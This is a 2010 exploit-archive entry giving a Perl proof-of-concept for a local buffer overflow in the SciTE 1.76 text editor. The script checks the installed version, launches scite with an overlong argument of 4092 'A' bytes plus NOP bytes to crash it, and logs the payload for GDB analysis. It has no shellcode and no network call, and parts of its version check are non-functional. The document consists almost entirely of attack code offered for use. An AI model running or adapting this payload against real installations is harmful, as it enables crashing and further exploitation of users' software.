# Exploit Title: Scite text editor :Local Buffer Overflow (PoC)
# Date: 28/06/2010
# Author: kmkz
# Version: [Scite 1.76 (lastest version)
# Tested on: Linux 2.6.31-22

# Code : Proof of Concept
#!/usr/bin/perl -wU
# 0-Days PoC (Local BoF Scite 1.76)
use strict;
use diagnostics;
use English \'-no_match_vars\';

use constant SUCCESS=>(1);
use constant FAILLURE=>(0);
use constant TARGET_BINARY=>(\"scite\");
use constant PAYLOAD=>(`perl -e \'print \"A\"x4092 . \"\\x90\\x90\\x90\\x90\"\'`);
use constant VERSION =>(\"/usr/share/scite/SciTE.html\");


BEGIN:

if(-e VERSION)
{
foreach(VERSION)
{
my @version_checking=($_=~ //);
@version_checking=split(/W/);

next if !($\' =~ m/1.76/) || warn (\"[*] WARNING: not Scite Version 1.76 \\012\\012\");
}


my $Exploitation=(system( TARGET_BINARY, PAYLOAD));
open (DUMP ,\">> Dump_Scite_Local_BoF_PoC.log\") or warn(\"[-] Can\'t create dump_file\\012\\015\");
printf(DUMP\" [+] This PoC generate a .txt document and crash scite exploiting a local Buffer Overflow (just for example) \\012\\012\\015\");

printf(\"%s\\012\", $Exploitation ) ;

printf(DUMP\"[+] Run in GDB for more information (using this payload):\\012 %s\", PAYLOAD);

close(DUMP);
exit(SUCCESS);
}


else
{
printf(\"[!] %s : MISSING \\012 [!] %s \\012\\012\",VERSION,$!);
exit(FAILLURE);
}